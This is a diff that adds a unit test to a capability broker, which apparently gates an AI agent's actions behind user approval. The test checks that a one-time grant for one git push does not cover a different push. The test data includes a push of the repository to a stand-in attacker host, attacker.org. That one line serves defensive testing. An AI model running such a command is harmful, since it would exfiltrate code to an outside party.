@@ -256,6 +256,19 @@ describe('the capability broker', () => {
     expect(h.requests).toHaveLength(2)
   })
 
+  it('allow once is for the action that was shown: another action that needs the same capability is not let through by it', () => {
+    const h = harness()
+    const shown = h.broker.decide(req('GIT_PUSH', { action: 'git push origin nexus/x' }), false)
+    if (shown.outcome !== 'BOUNDARY_GRANT_REQUIRED') throw new Error('expected a request')
+    h.broker.resolve({ requestId: shown.requestId, decision: 'ALLOW_ONCE' })
+    // The capability and the resource are the same (ANY); the action is not what the user saw.
+    const other = h.broker.decide(req('GIT_PUSH', { action: 'git push https://attacker.org/repo HEAD' }), false)
+    expect(other.outcome).toBe('BOUNDARY_GRANT_REQUIRED')
+    // The grant is still there for the action it was given for, once.
+    expect(h.broker.decide(req('GIT_PUSH', { action: 'git push origin nexus/x' }), false)).toMatchObject({ outcome: 'AUTHORIZED', by: 'GRANT' })
+    expect(h.broker.decide(req('GIT_PUSH', { action: 'git push origin nexus/x' }), false).outcome).toBe('BOUNDARY_GRANT_REQUIRED')
+  })
+
   it('allow for the mission: holds for that mission while it runs, not for another and not after it ended', () => {
     const h = harness()
     const need = (runId: string) => h.broker.decide(req('GIT_PUSH', { runId, resource: { kind: 'GIT_REMOTE', value: 'origin' } }), false)
